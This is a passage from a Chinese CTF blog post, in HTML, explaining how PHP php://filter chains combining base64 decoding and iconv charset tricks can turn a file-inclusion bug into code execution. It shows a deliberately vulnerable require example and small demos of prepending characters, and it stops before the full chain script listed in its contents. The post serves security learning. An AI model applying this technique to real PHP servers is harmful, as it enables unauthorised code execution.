@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="最近做到很多这种类似的题目，无论是pycc的include还是xyctf2024中的include_once，都可以实现一种从文件包含中进行getshell的手法，但自己没学过，做的时候就很崩 参考文章：PHP filters chain: What is it and how to use it Solving “includer’s revenge” from hxp ctf 2021 wit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="filters-chain实现RCE">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="最近做到很多这种类似的题目，无论是pycc的include还是xyctf2024中的include_once，都可以实现一种从文件包含中进行getshell的手法，但自己没学过，做的时候就很崩 参考文章：PHP filters chain: What is it and how to use it Solving “includer’s revenge” from hxp ctf 2021 wit">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519124546029.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519125214016.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519130655540.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519130845327.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519131302321.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519135756083.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519141602859.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519143942700.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519144612520.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519144707260.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519144801375.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519145803624.png">
+<meta property="article:published_time" content="2025-05-19T03:49:50.000Z">
+<meta property="article:modified_time" content="2025-05-23T04:41:39.313Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="RCE和文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250519124546029.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>filters-chain实现RCE</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/18/ctfshow%E6%96%B0%E6%89%8B%E6%9D%AF/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&text=filters-chain实现RCE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&title=filters-chain实现RCE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&is_video=false&description=filters-chain实现RCE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=filters-chain实现RCE&body=Check out this article: https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&title=filters-chain实现RCE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&title=filters-chain实现RCE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&title=filters-chain实现RCE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&title=filters-chain实现RCE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&name=filters-chain实现RCE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&t=filters-chain实现RCE"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EPHP%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.</span> <span class="toc-text">关于PHP过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFphp-filter"><span class="toc-number">1.1.</span> <span class="toc-text">什么是php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">转换过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#convert-iconv"><span class="toc-number">1.2.1.</span> <span class="toc-text">convert.iconv.*</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base64decode%E7%9A%84%E5%9E%83%E5%9C%BE%E5%A4%84%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">base64decode的垃圾处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%BA%8F%E5%88%97%E6%A0%87%E5%BF%97"><span class="toc-number">3.</span> <span class="toc-text">字符序列标志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6"><span class="toc-number">4.</span> <span class="toc-text">构造字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E8%84%9A%E6%9C%AC"><span class="toc-number">5.</span> <span class="toc-text">完整脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%B3%E5%AE%9A%E7%9A%84%E8%BF%87%E6%BB%A4%E5%99%A8%E9%93%BE%E7%94%9F%E6%88%90"><span class="toc-number">6.</span> <span class="toc-text">稳定的过滤器链生成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XYCTF2024-ezLFI"><span class="toc-number">7.</span> <span class="toc-text">XYCTF2024-ezLFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-temp%E8%A7%A3%E5%86%B3%E6%9C%89%E6%95%88%E6%96%87%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">8.</span> <span class="toc-text">php:&#x2F;&#x2F;temp解决有效文件的问题</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        filters-chain实现RCE
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-19T03:49:50.000Z" class="dt-published" itemprop="datePublished">2025-05-19</time>
+        
+        (Updated: <time datetime="2025-05-23T04:41:39.313Z" class="dt-updated" itemprop="dateModified">2025-05-23</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/">对于RCE和文件包含的一点总结</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/RCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">RCE和文件包含</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>最近做到很多这种类似的题目，无论是pycc的include还是xyctf2024中的include_once，都可以实现一种从文件包含中进行getshell的手法，但自己没学过，做的时候就很崩</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it">PHP filters chain: What is it and how to use it</a></p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving “includer’s revenge” from hxp ctf 2021 without controlling any files</a></p>
+<p><a target="_blank" rel="noopener" href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">https://bierbaumer.net/security/php-lfi-with-nginx-assistance/</a></p>
+<p>几篇国外的文章，但是写的很详细，就是翻译起来比较 费劲</p>
+<h2 id="关于PHP过滤器"><a href="#关于PHP过滤器" class="headerlink" title="关于PHP过滤器"></a>关于PHP过滤器</h2><p>其实在文件包含中很大多数情况都看得到使用伪协议过滤器去进行文件读取的操作，从filter到data和input，都积累了一定的姿势，但是这些始终都是开胃菜</p>
+<p>在大师傅的文章中，是研究了一个Laravel框架的register方法中的require函数，这个我们可以直接本地写一个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">require</span> <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; <span class="title function_ invoke__">register</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里暂且不谈如何利用，先把知识点讲清楚</p>
+<h3 id="什么是php-filter"><a href="#什么是php-filter" class="headerlink" title="什么是php:&#x2F;&#x2F;filter"></a>什么是php:&#x2F;&#x2F;filter</h3><p>其实这个之前就接触过很多次了，在文件包含include的时候经常用该封装器去读取文件数据流</p>
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250519124546029.png" alt="image-20250519124546029"></p>
+<p>然后我们看看过滤器</p>
+<p>可用过滤器列表有四种</p>
+<ul>
+<li>字符串过滤器</li>
+<li>转换过滤器</li>
+<li>压缩过滤器</li>
+<li>加密过滤器</li>
+</ul>
+<h3 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h3><p>转换过滤器我们最常用的就是convert.base64-encode 和 convert.base64-decode两种，这两种的作用等同于base64_encode()和base64_decode()函数，都是对数据进行base64的加密和解密，但是这里我们需要另外了解一个过滤器</p>
+<h4 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h4><p>这是一个压缩过滤器，相当于使用iconv()函数处理数据，但是这个过滤器不支持参数，但可使用输入&#x2F;输出的编码名称，组成过滤器名称，比如 <code>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</code> 或 <code>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</code> （两种写法的语义都相同）。</p>
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250519125214016.png" alt="image-20250519125214016"></p>
+<p>iconv函数用于将字符串从一种编码转换为另一种编码</p>
+<p>语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv(string $from_encoding, string $to_encoding, string $string): string|false</span><br></pre></td></tr></table></figure>
+
+<p>参数</p>
+<ul>
+<li><p><code>from_encoding</code></p>
+<p>用于解释的编码<code>string</code>。</p>
+</li>
+<li><p><code>to_encoding</code></p>
+<p>结果所需的编码。</p>
+</li>
+<li><p>string</p>
+</li>
+</ul>
+<p>要转化的字符串</p>
+<p>返回值</p>
+<p>返回转换后的字符串，或者如果发生错误返回false。</p>
+<p>讲完了iconv过滤器，我们看看另一个有意思的地方</p>
+<h2 id="base64decode的垃圾处理"><a href="#base64decode的垃圾处理" class="headerlink" title="base64decode的垃圾处理"></a>base64decode的垃圾处理</h2><p>关于base64，之前仅仅停留在绕过关键字过滤的层面，并为对其进行深入了解</p>
+<p>需要记住的是，**base64的有效字符包含大小写字母(a-z,A-Z)，数字(0-9)，两个额外字符(+，&#x2F;)，另外还有一个填充字符(&#x3D;)**，那么如果包含其他字符的话，此时base64会怎么处理呢</p>
+<p>其实之前我就有了解到，php中base64处理函数处理数据的时候十分灵活，通常会自动对字符串进行一个极佳的处理，例如我们这里尝试一下</p>
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250519130655540.png" alt="image-20250519130655540"></p>
+<p>发现一个很好玩的现象，如果我们在需要base64decode的字符前面加上一些非法字符，php并不会进行报错，而是忽略了这些无效的字符，最终解码的内容还是YmFzZTY0</p>
+<p>然而这种现象不止表现在字符前，还可以在字符中和字符末尾加上非法字符，这始终不影响我们的解码，这恰恰说明了base64_decode函数在处理字符的时候只会过滤有效的字符</p>
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250519130845327.png" alt="image-20250519130845327"></p>
+<p>那换成在filter中的过滤器convert.base64-decode呢？</p>
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250519131302321.png" alt="image-20250519131302321"></p>
+<p>结果显而易见，都是一样的</p>
+<p>但是即使PHP base64-decode filter和base64_decode函数在行为上非常接近，但它们之间在解释’&#x3D;’字符的方式上还是有区别的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/# echo &quot;YmFzZTY0&quot; &gt; test.txt</span><br><span class="line"></span><br><span class="line">root@VM-16-12-ubuntu:/# php -r &quot;echo file_get_contents(&#x27;php://filter/read=convert.base64-decode/resource=test.txt&#x27;);&quot;</span><br><span class="line">base64</span><br><span class="line"></span><br><span class="line">root@VM-16-12-ubuntu:/# php -r &quot;echo base64_decode(&#x27;YmFzZT==Y0&#x27;);&quot;</span><br><span class="line">base64</span><br><span class="line"></span><br><span class="line">root@VM-16-12-ubuntu:/# echo &quot;YmFzZTY0==&quot; &gt; test1.txt</span><br><span class="line"></span><br><span class="line">root@VM-16-12-ubuntu:/# php -r &quot;echo file_get_contents(&#x27;php://filter/read=convert.base64-decode/resource=test1.txt&#x27;);&quot;</span><br><span class="line">PHP Warning:  file_get_contents(): Stream filter (convert.base64-decode): invalid byte sequence in Command line code on line 1</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到，在面对字符<code>=</code>的时候，由于某种未知的原因，base64-decode过滤器与默认的base64_decode PHP函数相比，过滤器不能正确地处理等号，所以需要解决这个问题我们需要做什么呢？</p>
+<p>事情又回到<code>convert.iconv.*</code>过滤器上，之前我们在了解filter的时候就知道，参数中是可以设置一个或多个过滤器的，那我们是否可以将数据流进行一个编码后再进行base64过滤器的处理呢？</p>
+<p>解决方案之一是使用UTF 7编码，它将等号转换为其他字符，而不会干扰base64解码过滤器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/# echo &quot;YmFzZTY0==&quot; &gt; test1.txt</span><br><span class="line"></span><br><span class="line">root@VM-16-12-ubuntu:/# php -r &quot;echo file_get_contents(&#x27;php://filter/read=convert.iconv.UTF8.UTF7/convert.base64-decode/resource=test1.txt&#x27;);&quot;</span><br><span class="line">base64���</span><br></pre></td></tr></table></figure>
+
+<p>filter链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.iconv.UTF8.UTF7/convert.base64-decode/resource=test1.txt</span><br></pre></td></tr></table></figure>
+
+<p>这里的话利用iconv将数据流从UTF8转化成UTF7，然后再进行base6解码，这里的话就会将<code>=</code>号进行编码为<code>+AD0</code>，然后被base64解码为无效的字符</p>
+<p>经过上面的测试，我们可以从垃圾字符中过滤出有效的字符了，然后我们进入一个核心的问题，那就是从编码中过滤出前置字符，此时我们需要深入字符编码RFC，因为一些RFC实际上可以有一种方式去前置字符</p>
+<h2 id="字符序列标志"><a href="#字符序列标志" class="headerlink" title="字符序列标志"></a>字符序列标志</h2><p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250519135756083.png" alt="image-20250519135756083"></p>
+<p>翻译过来就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">字节顺序标记（BOM）</span><br><span class="line">   Unicode标准和ISO 10646定义了字符“ZERO WIDTH</span><br><span class="line">   非中断空间”（0xFEFF），也被非正式地称为“字节</span><br><span class="line">   订单标记”（缩写为“BOM”）。后一个名字暗示了第二个</span><br><span class="line">   字符的可能用法，除了作为</span><br><span class="line">   真正的“零宽度非中断空间”内的文字。这种用法，</span><br><span class="line">   根据Unicode第2.4节和ISO 10646附录F（资料性）的建议，</span><br><span class="line">   是将0xFEFF字符前置到Unicode字符流，</span><br><span class="line">   “签名”;这样的串行化流的接收器然后可以使用</span><br><span class="line">   初始字符作为流由以下内容组成的提示</span><br><span class="line">   Unicode字符和作为识别序列化顺序的一种方法。</span><br><span class="line">   在序列化的UTF-16中，前缀有这样的签名，顺序是</span><br><span class="line">   big-endian，如果前两个八位字节是0xFE后跟0xFF;如果它们</span><br><span class="line">   是0xFF后面跟着0xFE，顺序是little-endian。注意</span><br><span class="line">   0xFFFE不是Unicode字符，正是为了保留</span><br><span class="line">   0xFEFF作为字节顺序标记的有用性。</span><br></pre></td></tr></table></figure>
+
+<p>这里其实不难看出，将0xFEFF字符前置到Unicode字符流，从而实现一种签名</p>
+<p>另外再看看韩文字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">It is assumed that the starting code of the message is ASCII.  ASCII</span><br><span class="line">   and Korean characters can be distinguished by use of the shift</span><br><span class="line">   function.  For example, the code SO will alert us that the upcoming</span><br><span class="line">   bytes will be a Korean character as defined in KSC 5601.  To return</span><br><span class="line">   to ASCII the SI code is used.</span><br><span class="line"></span><br><span class="line">   Therefore, the escape sequence, shift function and character set used</span><br><span class="line">   in a message are as follows:</span><br><span class="line"></span><br><span class="line">           SO           KSC 5601</span><br><span class="line">           SI           ASCII</span><br><span class="line">           ESC $ ) C    Appears once in the beginning of a line</span><br><span class="line">                            before any appearance of SO characters.</span><br></pre></td></tr></table></figure>
+
+<p>翻译一下啊</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">假设消息的起始代码是ASCII。  ASCII</span><br><span class="line">   和韩语字符可以通过使用移位来区分</span><br><span class="line">   功能  例如，代码SO将提醒我们即将到来的</span><br><span class="line">   字节将是KSC 5601中定义的韩语字符。  返回</span><br><span class="line">   ASCII使用SI代码。</span><br><span class="line">   因此，转义序列，移位函数和字符集使用</span><br><span class="line">   消息如下：</span><br><span class="line">           所以           KSC 5601</span><br><span class="line">           SI           ASCII</span><br><span class="line">           ESC $）C    在行首出现一次</span><br><span class="line">                            在任何SO角色出现之前。</span><br></pre></td></tr></table></figure>
+
+<p>通过上面的例子可以看出，这些编码的背后有着一种”特殊的标识“，这些标识出现的时候就意味着后面的字符可能包含若干个该标识对应的编码</p>
+<p>例如<code>ESC $）C</code>，这是一个特殊的转义序列，用于在消息的开头（或行的开头）明确表示后续的字符可能包含 KSC 5601 编码的韩文字符。</p>
+<p>所以这意味着要被视为ISO-2022-KR，消息必须以序列<code>“ESC $）C”</code>开始。 </p>
+<table>
+<thead>
+<tr>
+<th align="left">Encoding identifier</th>
+<th align="left">Prepended characters</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">ISO2022KR</td>
+<td align="left">\x1b$)C</td>
+</tr>
+<tr>
+<td align="left">UTF16</td>
+<td align="left">\xff\xfe</td>
+</tr>
+<tr>
+<td align="left">UTF32</td>
+<td align="left">\xff\xfe\x00\x00</td>
+</tr>
+</tbody></table>
+<p>该表概述了ISO&#x2F;IEC 2022和Unicode编码的特殊前置序列。这些将在不破坏base64字符串完整性的情况下前置字符，使它们在PHP过滤器链中可用。</p>
+<h2 id="构造字符"><a href="#构造字符" class="headerlink" title="构造字符"></a>构造字符</h2><p>例如我们想前置一个字符8可以通过三个步骤实现</p>
+<p>我们的目标是从一个表跳转到另一个表以获得特定的字符。为了预先准备一个8，我们将需要iso 8859 -10（涵盖斯堪的纳维亚语言）和UNICODE表。</p>
+<p>图片来源<a target="_blank" rel="noopener" href="https://www.synacktiv.com/sites/default/files/inline-images/prepend_character8.png">https://www.synacktiv.com/sites/default/files/inline-images/prepend_character8.png</a></p>
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250519141602859.png" alt="image-20250519141602859"></p>
+<ul>
+<li>将字符串转换为UTF16以前置’\xff\xfe’</li>
+<li>将创建的字符串转换为latin6，’\xff’相当于拉丁字符kra<code> &#39;k&#39;</code></li>
+<li>将字符串转换回UTF16，其中字符<code>k&quot;</code>等效于”\x01\x38“</li>
+<li>最后，打印时将逐个字符解释链，因此“\x38”变为“8”</li>
+</ul>
+<p>用代码去实现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$return</span> = <span class="title function_ invoke__">iconv</span>( <span class="string">&#x27;UTF8&#x27;</span>, <span class="string">&#x27;UTF16&#x27;</span>, <span class="string">&quot;START&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$return</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$return</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$return2</span> = <span class="title function_ invoke__">iconv</span>( <span class="string">&#x27;LATIN6&#x27;</span>, <span class="string">&#x27;UTF16&#x27;</span>, <span class="variable">$return</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$return2</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$return2</span>.<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后运行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@VM-<span class="number">16</span>-<span class="number">12</span>-ubuntu:/<span class="comment"># php 1.php </span></span><br><span class="line">fffe53005400410052005400</span><br><span class="line">��START</span><br><span class="line">fffe3801fe005300000054000000410000005200000054000000</span><br><span class="line">��<span class="number">8</span>�START</span><br></pre></td></tr></table></figure>
+
